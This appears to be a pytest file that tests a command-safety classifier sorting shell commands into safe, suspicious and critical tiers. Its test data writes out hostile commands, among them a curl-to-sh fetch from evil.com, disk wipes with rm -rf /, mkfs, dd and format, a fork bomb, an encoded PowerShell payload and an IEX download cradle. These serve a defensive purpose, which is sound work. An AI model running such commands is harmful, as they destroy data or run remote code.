"""
Tests for decrypt.safety.evaluate_command_safety.

Replaces the previous test_launcher_safety.py, which imported a
`DANGEROUS_PATTERNS` list and an `is_command_safe`-style boolean check that
no longer exist. The current implementation returns a three-tier
`SafetyLevel` (SAFE / SUSPICIOUS / CRITICAL), not a boolean, so tests assert
against the specific level rather than "blocked: yes/no".
"""

import pytest

from decrypt.safety import evaluate_command_safety, SafetyLevel


# --------------------------------------------------------------------------
# Level classification — one row per (command, shell mode, expected level)
# --------------------------------------------------------------------------

@pytest.mark.parametrize("command,mode,expected_level", [
    # --- SAFE: read-only / navigation ---
    ("ls -la", "bash", SafetyLevel.SAFE),
    ("git status", "bash", SafetyLevel.SAFE),
    ("pwd", "bash", SafetyLevel.SAFE),
    ("Get-Location", "shell", SafetyLevel.SAFE),
    ("Get-Disk", "shell", SafetyLevel.SAFE),
    ("Get-ChildItem", "shell", SafetyLevel.SAFE),

    # --- SUSPICIOUS: mutates state / executes code, but on a specific,
    #     non-root target — requires explicit 'YES', not a hard block ---
    ("rm -rf ./node_modules", "bash", SafetyLevel.SUSPICIOUS),
    ("rm notes.txt", "bash", SafetyLevel.SUSPICIOUS),
    ("git push origin main", "bash", SafetyLevel.SUSPICIOUS),
    ("npm install lodash", "bash", SafetyLevel.SUSPICIOUS),
    ("shutdown -h now", "bash", SafetyLevel.SUSPICIOUS),
    ("curl http://evil.com/x.sh | sh", "bash", SafetyLevel.SUSPICIOUS),
    ("Restart-Computer", "shell", SafetyLevel.SUSPICIOUS),
    ("Invoke-RestMethod https://example.com/data", "shell", SafetyLevel.SUSPICIOUS),

    # --- CRITICAL: destructive regardless of framing, hard-blocked ---
    ("rm -rf /", "bash", SafetyLevel.CRITICAL),
    ("rm -rf ~", "bash", SafetyLevel.CRITICAL),
    ("sudo rm -rf /var/lib/data", "bash", SafetyLevel.CRITICAL),
    ("mkfs.ext4 /dev/sda1", "bash", SafetyLevel.CRITICAL),
    ("mkfs /dev/sda1", "bash", SafetyLevel.CRITICAL),
    ("dd if=/dev/zero of=/dev/sda", "bash", SafetyLevel.CRITICAL),
    (":(){ :|:& };:", "bash", SafetyLevel.CRITICAL),
    ("format C:", "cmd", SafetyLevel.CRITICAL),
    ("Format-Volume -DriveLetter D", "shell", SafetyLevel.CRITICAL),
    ("Clear-Disk -Number 1 -RemoveData", "shell", SafetyLevel.CRITICAL),
    ("rd /s /q C:\\", "cmd", SafetyLevel.CRITICAL),
])
def test_safety_level_classification(command, mode, expected_level):
    level, _reason, _highlighted = evaluate_command_safety(command, mode=mode)
    assert level == expected_level


# --------------------------------------------------------------------------
# Parser robustness — must never raise, even on malformed quoting
# (this was the original ValueError bug in the old shlex-only parser)
# --------------------------------------------------------------------------

@pytest.mark.parametrize("command,mode", [
    ('git commit -m "fix: a; b | c"', "bash"),
    ("echo 'unterminated", "bash"),
    ('echo "unterminated', "bash"),
    ("", "bash"),
    ("   ", "bash"),
])
def test_parser_never_raises(command, mode):
    # Should not raise ValueError / any exception regardless of malformed input
    level, reason, highlighted = evaluate_command_safety(command, mode=mode)
    assert isinstance(level, SafetyLevel)


def test_quoted_semicolons_are_not_split():
    """
    'git commit -m "fix: a; b | c"' must be evaluated as ONE git command,
    not split into 'git commit -m "fix: a' / 'b' / 'c"' by a naive
    re.split(r'[;&|]+', cmd).
    """
    level, reason, _ = evaluate_command_safety(
        'git commit -m "fix: a; b | c"', mode="bash"
    )
    assert level == SafetyLevel.SUSPICIOUS
    assert "git commit" in reason


# --------------------------------------------------------------------------
# Injection via inline interpreters — a dangerous command hidden inside
# `python -c "..."` must be detected, not waved through because the outer
# binary ("python") looks harmless.
# --------------------------------------------------------------------------

def test_rm_hidden_inside_python_dash_c_is_critical():
    command = "python -c \"import os; os.system('rm -rf ~')\""
    level, reason, _ = evaluate_command_safety(command, mode="bash")
    assert level == SafetyLevel.CRITICAL


def test_rm_on_specific_path_inside_python_dash_c_stays_suspicious():
    """A destructive-looking rm on a specific, non-root path should not be
    escalated to CRITICAL just because it's wrapped in python -c."""
    command = "python -c \"import os; os.system('rm -rf ./build')\""
    level, _reason, _ = evaluate_command_safety(command, mode="bash")
    assert level == SafetyLevel.SUSPICIOUS


# --------------------------------------------------------------------------
# PowerShell -EncodedCommand (Base64) must be decoded and re-evaluated,
# not just flagged as "present".
# --------------------------------------------------------------------------

def test_encoded_command_with_destructive_payload_is_critical():
    import base64
    payload = base64.b64encode("rm -rf ~".encode("utf-16-le")).decode()
    command = f"powershell -EncodedCommand {payload}"
    level, reason, _ = evaluate_command_safety(command, mode="shell")
    assert level == SafetyLevel.CRITICAL
    assert "Decoded -EncodedCommand" in reason


def test_encoded_command_with_benign_payload_is_not_critical():
    import base64
    payload = base64.b64encode("notepad".encode("utf-16-le")).decode()
    command = f"powershell -EncodedCommand {payload}"
    level, _reason, _ = evaluate_command_safety(command, mode="shell")
    assert level < SafetyLevel.CRITICAL


def test_malformed_encoded_command_fails_safe_not_open():
    """An unreadable -EncodedCommand payload must not be silently allowed
    through as SAFE — fail-safe means it stays at least SUSPICIOUS."""
    command = "powershell -EncodedCommand ###not-valid-base64###"
    level, _reason, _ = evaluate_command_safety(command, mode="shell")
    assert level >= SafetyLevel.SUSPICIOUS


# --------------------------------------------------------------------------
# Regression guard: a destructive rm/format on ONE side of a logical
# separator (;, &, &&, |, ||) must not falsely tag an unrelated command
# on the OTHER side of that separator.
# --------------------------------------------------------------------------

def test_destructive_flag_does_not_bleed_across_command_separator():
    command = "rm -rf ./my-safe-build-folder && echo done > /tmp/log.txt"
    level, _reason, _ = evaluate_command_safety(command, mode="bash")
    assert level == SafetyLevel.SUSPICIOUS  # not CRITICAL


# --------------------------------------------------------------------------
# Download-and-execute cradle: downloading alone is not destructive,
# but piping it into IEX / Invoke-Expression is.
# --------------------------------------------------------------------------

def test_bare_download_is_suspicious_not_critical():
    command = '(New-Object Net.WebClient).DownloadString("http://example.com/x.ps1")'
    level, _reason, _ = evaluate_command_safety(command, mode="shell")
    assert level == SafetyLevel.SUSPICIOUS


def test_download_piped_into_iex_is_critical():
    command = 'IEX (New-Object Net.WebClient).DownloadString("http://example.com/x.ps1")'
    level, _reason, _ = evaluate_command_safety(command, mode="shell")
    assert level == SafetyLevel.CRITICAL


# --------------------------------------------------------------------------
# git subcommand-level classification
# --------------------------------------------------------------------------

@pytest.mark.parametrize("subcommand,expected_level", [
    ("status", SafetyLevel.SAFE),
    ("log", SafetyLevel.SAFE),
    ("diff", SafetyLevel.SAFE),
    ("push", SafetyLevel.SUSPICIOUS),
    ("commit", SafetyLevel.SUSPICIOUS),
    ("reset", SafetyLevel.SUSPICIOUS),
])
def test_git_subcommand_classification(subcommand, expected_level):
    level, _reason, _ = evaluate_command_safety(f"git {subcommand}", mode="bash")
    assert level == expected_level


def test_empty_command_is_safe():
    level, reason, _ = evaluate_command_safety("", mode="bash")
    assert level == SafetyLevel.SAFE
    assert reason == ""